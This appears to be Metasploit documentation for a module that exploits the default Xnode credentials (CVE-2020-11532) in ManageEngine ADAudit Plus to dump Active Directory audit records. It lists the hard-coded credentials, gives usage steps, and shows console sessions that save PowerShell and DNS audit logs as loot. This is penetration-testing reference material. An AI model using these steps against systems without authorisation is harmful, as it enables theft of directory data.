## Vulnerable Application
The module exploits default admin credentials for the DataEngine Xnode server in ADAudit Plus versions prior to 6.0.3 (6032)
in order to dump the contents of Xnode data repositories (tables), which may contain varying amounts of Active Directory information
including domain names, host names, usernames and SIDs. The module can also be used against patched ADAudit Plus
versions if the correct credentials are provided.

The module's `check` method attempts to authenticate to the remote Xnode server. The default credentials are `atom`:`chegan`.
If the credentials are valid, the module will perform a few requests to the Xnode server to obtain information like the Xnode version.
This is mostly done as a sanity check to ensure the Xnode server is working as expected.

Next, the module will iterate over a list of known Xnode data repositories and perform several requests for each in order to:
- Check if the data repository is configured on the target
- Obtain the total number of records in the data repository
- Obtain both the lowest and the highest value for the ID field (column). These values will be used
to determine the range of possible records to be queried.

If a given data repository exists, the module uses the above information to dump the data repository contents.
The maximum number of records returned for a search query is 10. To overcome this, the module performs series of requests
using the `dr:/dr_search` action, while specifying the ID values for each record.
For example, if the lowest observed ID value is 15 and the highest is 41, the module will perform three requests:
1. A request for the records with ID values 15 to 24
2. A request for the records with ID values 25 to 34
3. A request for the records with ID values 35 to 41
Empty records are ignored.

To view the raw Xnode requests and responses, enter `set VERBOSE true` before running the module.

By default, the module dumps only the data repositories (tables) and fields (columns) specified in the configuration file.
The configuration file can be set via the `CONFIG_FILE` option, but this is not required because
a default config file exists at `data/exploits/manageengine_xnode/CVE-2020-11532/adaudit_plus_xnode_conf.yaml` that will
be used if `CONFIG_FILE` is not set.

The configuration file is also used to add labels to the values sent by Xnode in response to a query.
This means that for every value in the Xnode response, the module will add the corresponding field name to the results
before writing those to a JSON file in `~/.msf4/loot`.

It is also possible to use the `DUMP_ALL` option to obtain all data in all known data repositories without specifying data field names.
However, note that when using this option the data won't be labeled.

This module has been successfully tested against ManageEngine ADAudit Plus 6.0.3 (6031) running on Windows Server 2012 R2
and ADAudit Plus 6.0.7 (6076) running on Windows Server 2019.

## Installation Information
Vulnerable versions of ADAudit Plus are available [here](https://archives2.manageengine.com/active-directory-audit/).
All versions from 6000 through 6031 are configured with default Xnode credentials. Note that testing against
vulnerable versions from the archives will make data enumeration impossible because the free trials for those
versions do not seem to allow ADAudit Plus to actually start collecting data that can then be accessed via Xnode.

However, apart from some configuration changes, Xnode functions the same way on patched versions as it does on vulnerable versions,
so it is possible to test the modules against patched versions as long as the correct credentials are provided.

A free 30-day trial of the latest version of ADAudit Plus can be downloaded
[here](https://www.manageengine.com/products/active-directory-audit/download.html). To install, just run the .exe and follow the instructions.

In order to configure a patched ManageEngine ADAudit Plus instance for testing, follow these steps:
- Open the Xnode config file at `<install_dir>\apps\dataengine-xnode\conf\dataengine-xnode.conf`
- Note down the username and password
- Insert the following line:
```
xnode.connector.accept_remote_request = true
```
To launch ADAudit Plus, run Command Prompt as administrator and run: `<install_dir>\bin\run.bat`

## Verification Steps
1. Start msfconsole
2. Do: `use auxiliary/gather/manageengine_adaudit_plus_xnode_enum`
3. Do: `set RHOSTS [IP]`
4. Do: `run`

## Options
### CONFIG_FILE
YAML File specifying the data repositories (tables) and fields (columns) to dump.

### DUMP_ALL
Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.

## Scenarios
### ManageEngine ADAudit Plus 6.0.3 (6031) running on Windows Server 2012 R2
```
msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > options

Module options (auxiliary/gather/manageengine_adaudit_plus_xnode_enum):

   Name         Current Setting                                                Required  Description
   ----         ---------------                                                --------  -----------
   CONFIG_FILE  /home/wynter/dev/metasploit-framework/data/exploits/manageeng  no        YAML file specifying the data repositories (tables) and fields (columns) to dump
                ine_xnode/CVE-2020-11532/adaudit_plus_xnode_conf.yaml
   DUMP_ALL     false                                                          no        Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.
   PASSWORD     chegan                                                         yes       Password used to authenticate to the Xnode server
   RHOSTS       192.168.1.41                                                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        29118                                                          yes       The target port (TCP)
   USERNAME     atom                                                           yes       Username used to authenticate to the Xnode server

msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run
[*] Running module against 192.168.1.41

[*] 192.168.1.41:29118 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.1.41:29118 - Target seems to be Xnode.
[+] 192.168.1.41:29118 - The target appears to be vulnerable. Successfully authenticated to the Xnode server.
[*] 192.168.1.41:29118 - Obtained expected Xnode "de_healh" status: "GREEN".
[*] 192.168.1.41:29118 - Target is running Xnode version: "XNODE_1_0_0".
[*] 192.168.1.41:29118 - Obtained Xnode installation path: "C:\Program Files (x86)\ManageEngine\ADAudit Plus\apps\dataengine-xnode".
[*] 192.168.1.41:29118 - Data repository AdapFileAuditLog is empty.
[*] 192.168.1.41:29118 - The data repository AdapPowershellAuditLog is not available on the target.
[*] 192.168.1.41:29118 - The data repository AdapSysMonAuditLog is not available on the target.
[*] 192.168.1.41:29118 - The data repository AdapDNSAuditLog is not available on the target.
[*] 192.168.1.41:29118 - The data repository AdapADReplicationAuditLog is not available on the target.
[*] Auxiliary module execution completed
```

### ManageEngine ADAudit Plus 6.0.7 (6076) running on Windows Server 2019 (custom password)
```
msf6 > use auxiliary/gather/manageengine_adaudit_plus_xnode_enum
msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > set rhosts 192.168.1.25
rhosts => 192.168.1.25
msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > set password custom_password
password => custom_password
msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > options

Module options (auxiliary/gather/manageengine_adaudit_plus_xnode_enum):

   Name         Current Setting                                                                                                 Required  Description
   ----         ---------------                                                                                                 --------  -----------
   CONFIG_FILE  /root/github/manageengine/metasploit-framework/data/exploits/manageengine_xnode/CVE-2020-11532/adaudit_plus_xn  no        YAML file specifying the data repositories (tables) and fields (columns) to dump
                ode_conf.yaml
   DUMP_ALL     false                                                                                                           no        Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.
   PASSWORD     custom_password                                                                                                 yes       Password used to authenticate to the Xnode server
   RHOSTS       192.168.1.25                                                                                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        29118                                                                                                           yes       The target port (TCP)
   USERNAME     atom                                                                                                            yes       Username used to authenticate to the Xnode server

msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run

[*] Running module against 192.168.1.25

[*] 192.168.1.25:29118 - Running automatic check ("set AutoCheck false" to disable)
[+] 192.168.1.25:29118 - The target appears to be vulnerable. Successfully authenticated to the Xnode server.
[*] 192.168.1.25:29118 - Obtained expected Xnode "de_healh" status: "GREEN".
[*] 192.168.1.25:29118 - Target is running Xnode version: "DataEngine-XNode 1.1.0 (1100)".
[*] 192.168.1.25:29118 - Obtained Xnode installation path: "C:\Program Files\ManageEngine\ADAudit Plus\apps\dataengine-xnode".
[*] 192.168.1.25:29118 - Data repository AdapFileAuditLog is empty.
[+] 192.168.1.25:29118 - Data repository AdapPowershellAuditLog contains 261 records with ID numbers between 1.0 and 303.0.
[*] 192.168.1.25:29118 - Data repository AdapSysMonAuditLog is empty.
[+] 192.168.1.25:29118 - Data repository AdapDNSAuditLog contains 722 records with ID numbers between 1.0 and 926.0.
[*] 192.168.1.25:29118 - Data repository AdapADReplicationAuditLog is empty.
[*] 192.168.1.25:29118 - Attempting to request 261 records for data repository AdapPowershellAuditLog between IDs 1 and 303. This could take a while...
[*] 192.168.1.25:29118 - Processed 25 queries (max 10 records per query) so far. The last queried record ID was 250. The max ID is 303...
[+] 192.168.1.25:29118 - Saving 261 records from the AdapPowershellAuditLog data repository to /root/.msf4/loot/20220610073738_default_192.168.1.25_xnode_powershell_099421.json
[*] 192.168.1.25:29118 - Attempting to request 722 records for data repository AdapDNSAuditLog between IDs 1 and 926. This could take a while...
[*] 192.168.1.25:29118 - Processed 25 queries (max 10 records per query) so far. The last queried record ID was 250. The max ID is 926...
[*] 192.168.1.25:29118 - Processed 50 queries (max 10 records per query) so far. The last queried record ID was 500. The max ID is 926...
[*] 192.168.1.25:29118 - Processed 75 queries (max 10 records per query) so far. The last queried record ID was 750. The max ID is 926...
[+] 192.168.1.25:29118 - Saving 722 records from the AdapDNSAuditLog data repository to /root/.msf4/loot/20220610073754_default_192.168.1.25_xnode_dnsaudit_775121.json
[*] Auxiliary module execution completed
msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) >
```
